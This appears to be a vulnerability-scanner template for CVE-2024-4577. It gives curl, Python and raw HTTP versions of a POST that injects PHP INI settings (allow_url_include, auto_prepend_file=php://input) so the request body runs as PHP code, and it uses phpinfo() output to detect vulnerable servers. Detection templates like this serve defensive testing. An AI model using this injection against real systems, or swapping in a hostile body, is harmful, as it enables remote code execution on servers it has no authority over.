id: CVE-2024-4577

info:
  name: PHP Remote Code Execution via allow_url_include and auto_prepend_file
  author: Andy Gill / ZephrFish
  severity: critical
  description: Tests for remote PHP code execution by injecting PHP INI settings through query parameters.
  reference:
    - https://www.php.net/manual/en/ini.core.php#ini.allow-url-include
    - https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file
  tags: rce,php

variables:
  OAST: "<?php phpinfo(); ?>"

code:
  - engine:
      - sh
      - bash
    source: |
      curl -s -X POST "{{BaseURL}}/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input" \
      -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" \
      -H "Accept: */*" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Connection: keep-alive" \
      --data "$OAST"

  - engine:
      - py
      - python3
    source: |
      import requests
      import os

      url = f"{os.getenv('BaseURL')}/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input"
      headers = {
          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
          "Accept": "*/*",
          "Content-Type": "application/x-www-form-urlencoded",
          "Connection": "keep-alive"
      }
      data = os.getenv('OAST')
      response = requests.post(url, headers=headers, data=data, timeout=10)
      if "PHP Version" in response.text:
          print("Vulnerable")
      else:
          print("Not Vulnerable")

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input"
    headers:
      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
      Accept: "*/*"
      Content-Type: "application/x-www-form-urlencoded"
      Connection: "keep-alive"
    body: "{{OAST}}"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Version"
        part: body

      - type: status
        status:
          - 200

# digest: a unique identifier for this template
